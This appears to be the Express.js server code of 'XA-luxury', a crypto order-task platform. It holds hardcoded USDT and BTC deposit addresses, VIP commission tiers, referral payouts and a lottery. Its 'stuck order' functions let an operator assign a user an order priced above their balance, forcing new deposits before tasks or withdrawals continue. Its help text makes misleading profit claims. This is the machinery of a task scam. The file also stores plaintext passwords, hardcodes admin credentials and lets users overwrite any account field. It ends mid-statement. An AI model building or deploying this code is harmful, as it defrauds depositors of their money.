const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const QRCode = require("qrcode");

const PORT = process.env.PORT || 5173;
const DATA_FILE = path.join(__dirname, "data.json");
const PUBLIC = path.join(__dirname, "public");
const ADMIN = path.join(__dirname, "admin");

const PRODUCTS = [
  { name: "Panadol", amount: 15.99, image: "/assets/goods1-wacp4OKz.png" },
  { name: "Bodrex Herbal", amount: 7.99, image: "/assets/goods2-C6j4_iIl.png" },
  { name: "Konidin", amount: 5.99, image: "/assets/goods3-BnPWMrCg.png" },
  { name: "Birthday Collection", amount: 128.0, image: "/assets/product1-CFGVH2j5.png" },
  { name: "New Collection", amount: 96.0, image: "/assets/product2-CMNydW7K.png" },
];

const HELP = [
  {
    name: "help5",
    title: "Common Problem",
    content:
      "<p><strong>1.What is XA-luxury ?</strong></p><p>XA-luxury is a marketing and promotion company that helps XA-luxury merchants around the world get more sales on their orders and increase browsing data on Amazon's online store.</p><p>Combined with the latest P2P blockchain technology, the business policy of quickly connecting consumers and merchants through USDT (TRC20, ERC20). Registered users get commissions for orders, while merchants increase store sales data.</p><p><strong>2.How does the XA-luxury work??</strong></p><p>Daily XA-luxury Feedback shows which products need to increase sales. The user only needs to click the order with one click, and the system will automatically generate the order.</p><p><strong>3.Why is there a difference in the price of the same currency between two transactions?</strong></p><p>Currency transfer speed, network conditions and regional recognition can all create price differences.</p><p><strong>4.Investment profit?</strong></p><p>The higher the price of the item you get, the higher the profit. XA-luxury randomly distributes large commission orders.</p>",
  },
  {
    name: "help4",
    title: "Trading Rules",
    content:
      "<p>The system automatically generates commodity orders to users every day. Users complete each order payment in USDT and receive a commission. The system randomly assigns large commission orders.</p>",
  },
  {
    name: "help3",
    title: "How to recharge?",
    content:
      "<p>Before recharging, please bind your withdrawal address (support TRC-20) USDT address, then click recharge and select the blockchain you use.</p>",
  },
  {
    name: "help2",
    title: "How to withdraw?",
    content:
      "<p>After placing an order every day, you can withdraw normally. Withdrawals arrive within 24 hours. There is no withdrawal limit.</p>",
  },
  {
    name: "help1",
    title: "How to invite friends?",
    content:
      "<p>Invite via invite link or invite code. Lv1-59%, LV2-19%, L3-15% of daily income from lower-level friends.</p>",
  },
];

const LEVELS = [
  {
    id: 5213,
    agent_id: 13489,
    name: "VIP1",
    image: "/assets/c1-BaibLy3p.png",
    number: 1,
    level_price: "0.0000",
    commission_rate: "0.6000",
    follow_commission_rate: "0.0000",
    low_amount: "0.0000",
    order_number: 40,
    withdraw_number: 2,
    withdraw_min: "10.0000",
    withdraw_max: "1000.0000",
    send_rate: "0.0000",
    withdraw_charges: "0.0000",
    content_en: "<p>VIP1 daily 40 tasks, commission 0.6%.</p>",
  },
  {
    id: 5214,
    agent_id: 13489,
    name: "VIP2",
    image: "/assets/c2-DTftAq8X.png",
    number: 2,
    level_price: "500.0000",
    commission_rate: "0.8000",
    order_number: 50,
    withdraw_min: "20.0000",
    withdraw_max: "3000.0000",
    withdraw_charges: "0.0000",
    content_en: "<p>VIP2 daily 50 tasks, commission 0.8%.</p>",
  },
  {
    id: 5215,
    agent_id: 13489,
    name: "VIP3",
    image: "/assets/c3-DxK2VH12.png",
    number: 3,
    level_price: "2000.0000",
    commission_rate: "1.0000",
    order_number: 60,
    withdraw_min: "50.0000",
    withdraw_max: "10000.0000",
    withdraw_charges: "0.0000",
    content_en: "<p>VIP3 daily 60 tasks, commission 1.0%.</p>",
  },
];

function money(n) {
  return Number(n || 0).toFixed(4);
}
function nowStr() {
  const d = new Date();
  const p = (x) => String(x).padStart(2, "0");
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}
function token() {
  return crypto.randomBytes(16).toString("hex");
}
function ok(data, info = "ok") {
  return { code: 1, info, data };
}
function fail(info, data = {}) {
  return { code: 0, info, data };
}

const CHAIN_ICONS = {
  ERC20: "/assets/c1-BaibLy3p.png",
  TRC20: "/assets/c2-DTftAq8X.png",
  BTC: "/assets/c3-DxK2VH12.png",
};

function qrImage(address) {
  return "/qr?data=" + encodeURIComponent(String(address || "").trim());
}

function defaultRechargeAddresses() {
  return [
    {
      id: 2,
      name: "USDT-ERC20",
      type: "ERC20",
      address: "0x6f0106D0aF8b744f26AD0B7ba9DF8cE97a56f789",
      is_default: 1,
      enabled: 1,
      sort: 1,
      image: qrImage("0x6f0106D0aF8b744f26AD0B7ba9DF8cE97a56f789"),
      remark: "",
    },
    {
      id: 1,
      name: "USDT-TRC20",
      type: "TRC20",
      address: "TFL58VxgVm2L9Z2v1Hb2xhfpEQDCztvnk1",
      is_default: 0,
      enabled: 1,
      sort: 2,
      image: qrImage("TFL58VxgVm2L9Z2v1Hb2xhfpEQDCztvnk1"),
      remark: "",
    },
    {
      id: 4,
      name: "BTC",
      type: "BTC",
      address: "bc1pkm3472syqwq3v3fhqw2vchy7s4zn5gz6eqllgn05fqg66szs6pmqpmzk30",
      is_default: 0,
      enabled: 1,
      sort: 3,
      image: qrImage("bc1pkm3472syqwq3v3fhqw2vchy7s4zn5gz6eqllgn05fqg66szs6pmqpmzk30"),
      remark: "",
    },
  ];
}

function publicRechargeAddr(row) {
  const address = String(row.address || "").trim();
  const type = String(row.type || "TRC20").trim().toUpperCase();
  const image = String(row.image || "").trim();
  const useQr = !image || image.startsWith("/assets/") || image.startsWith("/qr?");
  return {
    id: row.id,
    name: row.name || type,
    address,
    type,
    is_default: Number(row.is_default) ? 1 : 0,
    image: useQr ? qrImage(address) : image,
    status: Number(row.enabled) ? 1 : 0,
    remark: row.remark || "",
    bank_name: "",
    bank_account: "",
    bank_real: "",
    sort: Number(row.sort || 0),
  };
}

function enabledRechargeAddrs() {
  return (db.rechargeAddresses || [])
    .filter((x) => Number(x.enabled) !== 0)
    .sort((a, b) => Number(a.sort || 0) - Number(b.sort || 0) || a.id - b.id)
    .map(publicRechargeAddr);
}

function defaultRechargeAddr() {
  const list = enabledRechargeAddrs();
  return list.find((x) => x.is_default) || list[0] || {};
}

function ensureRechargeStore() {
  if (!Array.isArray(db.rechargeAddresses) || !db.rechargeAddresses.length) {
    db.rechargeAddresses = defaultRechargeAddresses();
    db.nextAddr = 5;
    saveDb();
    return;
  }
  db.rechargeAddresses.forEach((row) => {
    if (row.enabled == null) row.enabled = 1;
    if (row.sort == null) row.sort = row.id || 0;
    if (row.type) row.type = String(row.type).trim().toUpperCase();
    if (!row.name) row.name = row.type;
    if (!row.image || String(row.image).startsWith("/assets/")) row.image = qrImage(row.address);
    if (row.remark == null) row.remark = "";
  });
  const maxId = db.rechargeAddresses.reduce((m, x) => Math.max(m, Number(x.id) || 0), 0);
  if (!db.nextAddr || db.nextAddr <= maxId) db.nextAddr = maxId + 1;
}

function seed() {
  return {
    admins: [{ username: "ouzai888", password: "a321321", name: "ouzai888" }],
    rechargeAddresses: defaultRechargeAddresses(),
    nextAddr: 5,
    users: [
      {
        id: 88728,
        agent_id: 13489,
        yqm: "5180526",
        amount: "1000.0000",
        amount_frozen: "0.0000",
        phone: "2222",
        password: "123456",
        trade_password: "123456",
        email: null,
        name: "2222",
        avatar: 1,
        amount_total: 0,
        amount_today: "0.0000",
        total_commission: "0.0000",
        total_order_commission: "0.0000",
        add_time_str: "2026-11-04 08:01",
        bank_account: "",
        bank_name: "",
        bank_real: "",
        bank_phone: null,
        accountType: 0,
        wallet_type: "",
        amount_all: 1000,
        amount_frozen_capital: "0.0000",
        amount_difference: "0.0000",
        is_set_root: 1,
        address: "TFL58VxgVm2L9Z2v1Hb2xhfpEQDCztvnk1",
        address2: "0xA487203A6E48E8C009073B58F88431B35c93f317",
        address3: "bc1pu2cjx73rjrv4e5rj8mf8f3s00d0gaxsn7p8pdrkuguymy4dcjn6s3yh9nw",
        address4: null,
        wallet_address: "",
        wallet_address_hide: "",
        credit: 100,
        gender_str: "Female",
        service_url: "https://wa.me/447380931510",
        task_number_vip: 40,
        task_number_today: 0,
        lottery_open: 1,
        qualification_open: 0,
        lottery_number: 2,
        commission_rate: "0.6000",
        vip_level: 1,
        vip_name: "VIP1",
        grab_enabled: 1,
        stuck: 0,
        frozen: 0,
        login_count: 2,
        last_ip: "127.0.0.1",
        parent: "ouzai888",
      },
      {
        id: 88727,
        agent_id: 13489,
        yqm: "5921144",
        amount: "0.0000",
        amount_frozen: "0.0000",
        phone: "111",
        password: "123456",
        trade_password: "123456",
        email: "111@luxury.local",
        name: "111",
        avatar: 1,
        amount_total: 0,
        amount_today: "0.0000",
        total_commission: "0.0000",
        total_order_commission: "0.0000",
        add_time_str: "2026-11-04 07:57",
        bank_account: "",
        bank_name: "",
        bank_real: "",
        accountType: 0,
        amount_frozen_capital: "0.0000",
        amount_difference: "0.0000",
        is_set_root: 1,
        address: "TPCrM65omBTZvviAVb36HyB1WTqp5wV2nw",
        address2: "",
        address3: "",
        wallet_address: "",
        wallet_address_hide: "",
        credit: 100,
        gender_str: "Female",
        service_url: "https://wa.me/447380931510",
        task_number_vip: 40,
        task_number_today: 0,
        lottery_open: 1,
        qualification_open: 0,
        lottery_number: 0,
        commission_rate: "0.6000",
        vip_level: 1,
        vip_name: "VIP1",
        grab_enabled: 1,
        stuck: 0,
        frozen: 0,
        login_count: 0,
        last_ip: "-",
        parent: "ouzai888",
      },
    ],
    tokens: {},
    adminTokens: {},
    orders: [],
    recharges: [],
    withdraws: [],
    changes: [],
    prizeRecords: [],
    nextOrder: 10001,
    nextUser: 88729,
    stuckPlans: [],
    nextPlan: 1,
  };
}

function loadDb() {
  try {
    if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
  } catch {}
  return seed();
}
function saveDb() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));
}

let db = loadDb();
ensureRechargeStore();
ensureUserFlags();
ensureStuckStore();

function ensureStuckStore() {
  if (!Array.isArray(db.stuckPlans)) db.stuckPlans = [];
  const maxId = db.stuckPlans.reduce((m, x) => Math.max(m, Number(x.id) || 0), 0);
  if (!db.nextPlan || db.nextPlan <= maxId) db.nextPlan = maxId + 1;
}

function parseSlash(raw) {
  return String(raw || "")
    .split(/[\/,，\s]+/)
    .map((x) => x.trim())
    .filter(Boolean);
}

function planTypeName(type) {
  return { multi: "多卡单", normal: "常规卡单", special: "特殊卡单", split: "拆分订单" }[type] || type;
}

function commissionOf(plan, amount) {
  const n = Number(plan.commission_rate || 0);
  if (String(plan.commission_type) === "fixed") return n;
  return Number(((amount * n) / 100).toFixed(4));
}

function syncStuckFlag(user) {
  const open = (db.stuckPlans || []).some((p) => p.uid === user.id && Number(p.status) === 0);
  user.stuck = open ? 1 : 0;
  if (!open) {
    user.stuck_at = 0;
    user.stuck_amount = "";
  }
}

function matchStuckPlan(user, nextNo) {
  const plans = (db.stuckPlans || []).filter((p) => p.uid === user.id && Number(p.status) === 0);
  const order = ["split", "special", "multi", "normal"];
  for (const type of order) {
    for (const p of plans) {
      if (p.type !== type) continue;
      if (type === "multi") {
        const nums = parseSlash(p.current_number).map(Number);
        const idx = nums.indexOf(nextNo);
        if (idx >= 0) return { plan: p, idx };
      } else if (type === "normal") {
        const start = Number(p.current_number);
        const times = Number(p.number || 1);
        if (nextNo >= start && nextNo < start + times) return { plan: p, idx: nextNo - start };
      } else if (Number(p.current_number) === nextNo) {
        return { plan: p, idx: 0 };
      }
    }
  }
  return null;
}

function consumePlan(hit) {
  const p = hit.plan;
  if (p.type === "multi") {
    const used = Array.isArray(p.used_index) ? p.used_index : [];
    if (!used.includes(hit.idx)) used.push(hit.idx);
    p.used_index = used;
    const total = parseSlash(p.current_number).length;
    p.used_count = used.length;
    if (used.length >= total) p.status = 1;
  } else if (p.type === "normal") {
    p.used_count = Number(p.used_count || 0) + 1;
    if (p.used_count >= Number(p.number || 1)) p.status = 1;
  } else {
    p.used_count = 1;
    p.status = 1;
  }
}

function buildPlanOrder(user, hit) {
  const p = hit.plan;
  let amount = Number(parseSlash(p.over_money)[hit.idx] || parseSlash(p.over_money)[0] || 0);
  let goods = p.goods || "Combo Collection";
  let count = 1;
  if (p.type === "split") {
    count = Number(p.number || 1);
    amount = Number(p.over_money) * count;
    goods = `拆分订单 x${count}`;
  }
  if (p.type === "special") goods = p.goods || "Special Combo";
  const commission = commissionOf(p, amount);
  const order = {
    id: db.nextOrder++,
    order_no: "L" + Date.now(),
    uid: user.id,
    phone: user.phone,
    goods_name: goods,
    goods_image: "/assets/product1-CFGVH2j5.png",
    goods_pic: "/assets/product1-CFGVH2j5.png",
    amount: money(amount),
    commission: money(commission),
    state: 0,
    state_str: "pending",
    time: nowStr(),
    isHappy: 1,
    stuck: 1,
    plan_id: p.id,
    plan_type: p.type,
    split_count: count,
  };
  db.orders.unshift(order);
  consumePlan(hit);
  user.stuck_at = Number(user.task_number_today || 0) + 1;
  user.stuck_amount = money(amount);
  syncStuckFlag(user);
  refreshDifference(user);
  return order;
}

function ensureUserFlags() {
  let dirty = false;
  (db.users || []).forEach((u) => {
    if (u.grab_enabled == null) {
      u.grab_enabled = 1;
      dirty = true;
    }
    if (u.qualification_open == null || Number(u.qualification_open) !== Number(u.grab_enabled)) {
      u.qualification_open = Number(u.grab_enabled) ? 1 : 0;
      dirty = true;
    }
    if (u.stuck == null) {
      u.stuck = 0;
      dirty = true;
    }
    if (u.stuck_at == null) u.stuck_at = 0;
    if (u.stuck_amount == null) u.stuck_amount = "";
    if (u.stuck_rate == null) u.stuck_rate = 2;
    if (u.loan == null) u.loan = "0.0000";
    if (u.profit_loss == null) u.profit_loss = "0.0000";
    if (u.register_ip == null) u.register_ip = u.last_ip || "-";
    if (u.source_web == null) u.source_web = "Luxury";
    if (u.status == null) u.status = u.frozen ? 0 : 1;
  });
  if (dirty) saveDb();
}

function setGrab(user, on) {
  const v = on ? 1 : 0;
  user.grab_enabled = v;
  user.qualification_open = v;
}

function isGrabOpen(user) {
  return Number(user.grab_enabled) === 1 && !Number(user.frozen);
}

function pendingOrder(user) {
  return db.orders.find((o) => o.uid === user.id && o.state === 0) || null;
}

function cancelPending(user, reason) {
  db.orders
    .filter((o) => o.uid === user.id && o.state === 0)
    .forEach((o) => {
      o.state = 2;
      o.state_str = reason || "cancelled";
    });
}

function refreshDifference(user) {
  const pending = pendingOrder(user);
  if (pending) {
    user.amount_difference = money(Math.max(0, Number(pending.amount) - Number(user.amount)));
  } else {
    user.amount_difference = "0.0000";
  }
}

function applyStuck(user, b) {
  const nextNo = Number(user.task_number_today || 0) + 1;
  const at = Number(b.stuck_at || 0) || nextNo;
  const rate = Number(b.stuck_rate || user.stuck_rate || 2) || 2;
  let amount = Number(b.stuck_amount || 0);
  if (!(amount > 0)) amount = Number((Number(user.amount) * rate + 88).toFixed(2));
  user.stuck = 1;
  user.stuck_at = at;
  user.stuck_rate = rate;
  user.stuck_amount = money(amount);
  user.stuck_goods = String(b.stuck_goods || "Combo Collection");
  if (Number(b.immediate) === 1 || at <= nextNo) {
    cancelPending(user, "replaced-by-stuck");
    makeStuckOrder(user);
  }
}

function clearStuck(user, dropOrder) {
  user.stuck = 0;
  user.stuck_at = 0;
  user.stuck_amount = "";
  user.stuck_goods = "";
  if (dropOrder) {
    db.orders
      .filter((o) => o.uid === user.id && o.state === 0 && o.isHappy)
      .forEach((o) => {
        o.state = 2;
        o.state_str = "cancelled";
      });
  }
  refreshDifference(user);
}

function makeStuckOrder(user) {
  const amount = Number(user.stuck_amount) || Number(user.amount) * 2 + 88;
  const commission = Number((amount * Number(user.commission_rate)) / 100);
  const order = {
    id: db.nextOrder++,
    order_no: "L" + Date.now(),
    uid: user.id,
    phone: user.phone,
    goods_name: user.stuck_goods || "Combo Collection",
    goods_image: "/assets/product1-CFGVH2j5.png",
    goods_pic: "/assets/product1-CFGVH2j5.png",
    amount: money(amount),
    commission: money(commission),
    state: 0,
    state_str: "pending",
    time: nowStr(),
    isHappy: 1,
    stuck: 1,
  };
  db.orders.unshift(order);
  refreshDifference(user);
  return order;
}

function resetTasks(user) {
  user.task_number_today = 0;
  user.amount_today = "0.0000";
  cancelPending(user, "reset");
  if (user.stuck) {
    user.stuck_at = 1;
  }
  refreshDifference(user);
}

function publicOrder(o, user) {
  const qty = Number(o.split_count || o.goods_number || 1) || 1;
  const total = Number(o.total_money != null ? o.total_money : o.amount || 0);
  const unit = Number(o.goods_price != null ? o.goods_price : qty ? total / qty : total);
  const commission = Number(o.commission_money != null ? o.commission_money : o.commission || 0);
  const pending = Number(o.state) === 0;
  const bal = user ? Number(user.amount || 0) : 0;
  const diff = pending ? Math.max(0, total - bal) : Number(o.diff_money || 0);
  const statusName = o.state === 1 ? "completed" : o.state === 2 ? "cancelled" : "pending";
  return {
    ...o,
    goods_title: o.goods_title || o.goods_name || "",
    goods_name: o.goods_name || o.goods_title || "",
    goods_price: money(unit),
    goods_number: qty,
    total_money: money(total),
    commission_money: money(commission),
    amount: money(total),
    commission: money(commission),
    diff_money: money(diff),
    goods_pic: o.goods_pic || o.goods_image || "",
    goods_image: o.goods_image || o.goods_pic || "",
    status_str: o.state_str || statusName,
    status_name: o.status_name || statusName,
    status_text: o.status_text || o.state_str || statusName,
    order_status: o.order_status || statusName,
    add_time_str: o.add_time_str || o.time || "",
    created_at: o.created_at || o.time || "",
    created_time: o.time || "",
    begin_time_str: o.begin_time_str || o.time || "",
  };
}

function publicUser(u) {
  const { password, trade_password, ...rest } = u;
  rest.amount_all = Number(u.amount);
  if (!rest.email) rest.email = null;
  refreshDifference(u);
  rest.amount_difference = u.amount_difference;
  rest.qualification_open = Number(u.qualification_open || u.grab_enabled) ? 1 : 0;
  rest.grab_enabled = Number(u.grab_enabled) ? 1 : 0;
  return rest;
}
function findUserByToken(req) {
  const auth = req.headers.authorization || "";
  const bearer = auth.startsWith("Bearer ") ? auth.slice(7) : "";
  const apiToken = req.headers["api-token"] || "";
  const raw = bearer || apiToken || req.headers.token || "";
  const id = db.tokens[raw];
  return db.users.find((u) => u.id === id) || null;
}
function findAdmin(req) {
  const t = req.headers["admin-token"] || req.query.admin_token || req.body.admin_token;
  const name = db.adminTokens[t];
  return db.admins.find((a) => a.username === name) || null;
}
function body(req) {
  return Object.assign({}, req.query, req.body || {});
}
function pageWrap(list, page = 1, limit = 20) {
  const p = Number(page) || 1;
  const l = Number(limit) || 20;
  const start = (p - 1) * l;
  return {
    page: { limit: l, total: list.length, pages: Math.max(1, Math.ceil(list.length / l)), current: p },
    list: list.slice(start, start + l),
  };
}

const app = express();
app.use(express.json({ limit: "4mb" }));
app.use((err, _req, res, next) => {
  if (err instanceof SyntaxError) return res.json(fail("invalid json"));
  next(err);
});
app.use(express.urlencoded({ extended: true }));
app.use((req, _res, next) => {
  req.body = req.body || {};
  next();
});

function api(method, route, handler) {
  app[method](route, (req, res) => {
    try {
      const out = handler(req, res);
      if (out && typeof out.then === "function") return;
      if (out !== undefined) res.json(out);
    } catch (e) {
      res.json(fail(e.message || "Server error"));
    }
  });
}
function both(route, handler) {
  api("post", route, handler);
  api("get", route, handler);
}

both("/data/api.login/login", (req) => {
  const b = body(req);
  const account = String(b.mobile || b.email || b.phone || b.username || "").trim();
  const password = String(b.password || "");
  const user = db.users.find((u) => u.phone === account || u.name === account || u.email === account);
  if (!user || user.password !== password) return fail("Account or password error");
  if (user.frozen) return fail("Account frozen");
  const t = token();
  db.tokens[t] = user.id;
  user.login_count = (user.login_count || 0) + 1;
  user.last_ip = req.ip;
  saveDb();
  return { code: 1, info: "ok", token: t, data: { token: t, user: publicUser(user) } };
});

both("/data/api.login/register", (req) => {
  const b = body(req);
  const phone = String(b.mobile || b.phone || b.email || "").trim();
  const password = String(b.password || "");
  const invite = String(b.invite_code || b.yqm || "");
  if (!phone || password.length < 6) return fail("Invalid account or password");
  if (db.users.some((u) => u.phone === phone)) return fail("Account already exists");
  const parent = db.users.find((u) => u.yqm === invite);
  const id = db.nextUser++;
  const user = {
    id,
    agent_id: 13489,
    yqm: String(5000000 + id),
    amount: "0.0000",
    amount_frozen: "0.0000",
    phone,
    password,
    trade_password: password,
    email: phone.includes("@") ? phone : `${phone}@luxury.local`,
    name: phone,
    avatar: 1,
    amount_total: 0,
    amount_today: "0.0000",
    total_commission: "0.0000",
    add_time_str: nowStr().slice(0, 16),
    bank_account: "",
    bank_name: "",
    accountType: 0,
    amount_frozen_capital: "0.0000",
    amount_difference: "0.0000",
    is_set_root: 1,
    address: "",
    address2: "",
    address3: "",
    wallet_address: "",
    credit: 100,
    gender_str: "Female",
    service_url: "https://wa.me/447380931510",
    task_number_vip: 40,
    task_number_today: 0,
    lottery_open: 1,
    lottery_number: 0,
    qualification_open: 1,
    commission_rate: "0.6000",
    vip_level: 1,
    vip_name: "VIP1",
    grab_enabled: 1,
    stuck: 0,
    stuck_at: 0,
    stuck_amount: "",
    stuck_rate: 2,
    loan: "0.0000",
    profit_loss: "0.0000",
    source_web: "Luxury",
    frozen: 0,
    login_count: 0,
    parent: parent ? parent.phone : "ouzai888",
  };
  db.users.push(user);
  saveDb();
  const t = token();
  db.tokens[t] = user.id;
  saveDb();
  return { code: 1, info: "ok", token: t, data: { token: t, user: publicUser(user) } };
});

function needUser(req) {
  const u = findUserByToken(req);
  if (!u) {
    const err = fail("Session expired");
    err.code = 4001;
    return { err };
  }
  return { user: u };
}

both("/data/api.user/getMemberInfo", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  return ok(publicUser(user));
});
both("/data/api.user/getLevelList", () => ok(LEVELS));
both("/data/api.user/getPlatform", () => ok({ has_notice: 0 }));
both("/data/api.user/getLastNotice", () => ok({ has_notice: 0 }));
both("/data/api.user/readNotice", () => ok({}));
both("/data/api.user/getTeamsData", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const kids = db.users.filter((u) => u.parent === user.phone || u.parent === user.name);
  return ok({
    total_people: kids.length,
    total_task: kids.reduce((s, u) => s + (u.task_number_today || 0), 0),
    count1: kids.length,
    count2: 0,
    count3: 0,
    commission1: 0,
    commission2: 0,
    commission3: 0,
    total_order_commission: Number(user.total_commission || 0),
  });
});
both("/data/api.user/getQualification", () => ok({ content: "" }));
both("/data/api.data/carousel", () => ok([]));
both("/data/api.data/getHelpList", () => ok(HELP));
both("/data/api.data/pager", () => ok({ list: [] }));
both("/data/api.user/getCustomerServiceList", () =>
  ok([{ id: 1, name: "Service", url: "https://wa.me/447380931510" }])
);
both("/data/api.user/getPrizeInfo", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  return ok({ id: user.id, lottery_number: user.lottery_number || 0, bg1: "", bg2: "" });
});
both("/data/api.user/getPrizeList", () =>
  ok({
    prizes: [
      { fonts: [{ text: "2888USDT" }] },
      { fonts: [{ text: "166USDT" }] },
      { fonts: [{ text: "300USDT" }] },
      { fonts: [{ text: "888USDT" }] },
      { fonts: [{ text: "28USDT" }] },
      { fonts: [{ text: "88USDT" }] },
    ],
  })
);
both("/data/api.user/randPrize", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  if ((user.lottery_number || 0) <= 0) return fail("No lottery times");
  user.lottery_number -= 1;
  const prize = ["28USDT", "88USDT", "166USDT"][Math.floor(Math.random() * 3)];
  const amt = Number(prize.replace("USDT", ""));
  user.amount = money(Number(user.amount) + amt);
  db.prizeRecords.unshift({ id: Date.now(), uid: user.id, prize, time: nowStr() });
  saveDb();
  return ok({ prizeIndex: 0, prize });
});
both("/data/api.user/getPrizeRecords", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  return ok(pageWrap(db.prizeRecords.filter((x) => x.uid === user.id)));
});
both("/data/api.user/getRechargeAddressList", () => ok(enabledRechargeAddrs()));
both("/data/api.user/getRechargeAddressDefault", () => ok(defaultRechargeAddr()));
both("/data/api.user/getNewPersonWalletList", () => ok([]));
both("/data/api.user/setMulWalletInfo", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  if (b.address) user.wallet_address = b.address;
  if (b.trc20) user.address = b.trc20;
  saveDb();
  return ok({});
});
both("/data/api.user/setPersonInfo", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  Object.assign(user, body(req));
  saveDb();
  return ok(publicUser(user));
});
both("/data/api.user/changePassword", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  if (b.old_password && b.old_password !== user.password) return fail("Old password error");
  user.password = b.password || b.new_password || user.password;
  saveDb();
  return ok({});
});
both("/data/api.user/changeTradePassword", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  user.trade_password = b.password || b.new_password || user.trade_password;
  saveDb();
  return ok({});
});
both("/data/api.user/userRecharge", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  const amount = Number(b.amount || 0);
  if (amount <= 0) return fail("Invalid amount");
  const row = {
    id: Date.now(),
    uid: user.id,
    phone: user.phone,
    amount: money(amount),
    type: b.type || "TRC20",
    status: 1,
    status_str: "success",
    time: nowStr(),
    tx: token(),
  };
  db.recharges.unshift(row);
  user.amount = money(Number(user.amount) + amount);
  db.changes.unshift({
    id: Date.now(),
    uid: user.id,
    phone: user.phone,
    type: "recharge",
    amount: money(amount),
    after: user.amount,
    time: nowStr(),
    remark: "user recharge",
  });
  saveDb();
  return ok(row);
});
both("/data/api.user/queryRecharge", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  const row = db.recharges.find((x) => String(x.id) === String(b.id)) || db.recharges.find((x) => x.uid === user.id);
  return ok(row || {});
});
both("/data/api.user/rechargeRecord", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  return ok(pageWrap(db.recharges.filter((x) => x.uid === user.id), b.page));
});
both("/data/api.user/withdraw_usdt", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  const amount = Number(b.amount || 0);
  if (amount <= 0) return fail("Invalid amount");
  if (Number(user.amount) < amount) return fail("Insufficient balance");
  if (user.trade_password && b.pay_password && b.pay_password !== user.trade_password) return fail("Withdraw password error");
  user.amount = money(Number(user.amount) - amount);
  const row = {
    id: Date.now(),
    uid: user.id,
    phone: user.phone,
    amount: money(amount),
    address: b.address || user.address,
    status: 0,
    status_str: "pending",
    time: nowStr(),
    type: "USDT",
  };
  db.withdraws.unshift(row);
  saveDb();
  return ok(row);
});
both("/data/api.user/withdraw_bank", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  const amount = Number(b.amount || 0);
  if (Number(user.amount) < amount) return fail("Insufficient balance");
  user.amount = money(Number(user.amount) - amount);
  const row = {
    id: Date.now(),
    uid: user.id,
    phone: user.phone,
    amount: money(amount),
    bank_name: b.bank_name || user.bank_name,
    bank_account: b.bank_account || user.bank_account,
    status: 0,
    status_str: "pending",
    time: nowStr(),
    type: "BANK",
  };
  db.withdraws.unshift(row);
  saveDb();
  return ok(row);
});
both("/data/api.user/withdrawRecord", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  return ok(pageWrap(db.withdraws.filter((x) => x.uid === user.id), b.page));
});
both("/data/api.user/accountChangeRecord", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  return ok(pageWrap(db.changes.filter((x) => x.uid === user.id), b.page));
});

both("/data/api.order/create", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  if (!isGrabOpen(user)) return fail("Grab order is closed");
  if (user.frozen) return fail("Account frozen");
  if (user.task_number_today >= user.task_number_vip) return fail("Daily tasks completed");
  const pending = pendingOrder(user);
  if (pending) return ok(publicOrder(pending, user));
  const nextNo = Number(user.task_number_today || 0) + 1;
  const hitPlan = matchStuckPlan(user, nextNo);
  if (hitPlan) {
    const order = buildPlanOrder(user, hitPlan);
    saveDb();
    return ok(publicOrder(order, user));
  }
  const hitStuck = Number(user.stuck) && (!Number(user.stuck_at) || Number(user.stuck_at) === nextNo);
  if (hitStuck) {
    const order = makeStuckOrder(user);
    saveDb();
    return ok(publicOrder(order, user));
  }
  const product = PRODUCTS[Math.floor(Math.random() * PRODUCTS.length)];
  const amount = product.amount;
  if (Number(user.amount) < amount) return fail("Insufficient balance");
  const commission = Number((amount * Number(user.commission_rate)) / 100);
  const order = {
    id: db.nextOrder++,
    order_no: "L" + Date.now(),
    uid: user.id,
    phone: user.phone,
    goods_name: product.name,
    goods_image: product.image,
    goods_pic: product.image,
    amount: money(amount),
    commission: money(commission),
    state: 0,
    state_str: "pending",
    time: nowStr(),
    isHappy: 0,
  };
  db.orders.unshift(order);
  refreshDifference(user);
  saveDb();
  return ok(publicOrder(order, user));
});
both("/data/api.order/submitOrder", (req) => {
  const { user, err } = needUser(req);
  if (err) return err;
  const b = body(req);
  const order = db.orders.find((o) => {
    if (o.uid !== user.id) return false;
    const key = String(b.order_no || b.id || b.order_id || "");
    return String(o.order_no) === key || String(o.id) === key;
  });
  if (!order) return fail("Order not found");
  if (order.state !== 0) return fail("Order already submitted");
  const amount = Number(order.amount);
  const commission = Number(order.commission_money != null ? order.commission_money : order.commission || 0);
  if (Number(user.amount) < amount) {
    refreshDifference(user);
    saveDb();
    return fail(`Insufficient balance, difference ${user.amount_difference}`);
  }
  // 货款虚拟支付后退回，余额只加佣金。卡单仍要求余额盖得住订单金额。
  user.amount = money(Number(user.amount) + commission);
  user.task_number_today += 1;
  user.amount_today = money(Number(user.amount_today) + commission);
  user.total_commission = money(Number(user.total_commission) + commission);
  user.profit_loss = money(Number(user.profit_loss || 0) + commission);
  order.state = 1;
  order.state_str = "completed";
  order.finish_time = nowStr();
  if (order.stuck || order.isHappy) {
    syncStuckFlag(user);
    if (!user.stuck) {
      user.stuck_at = 0;
      user.stuck_amount = "";
    }
  }
  refreshDifference(user);
  db.changes.unshift({
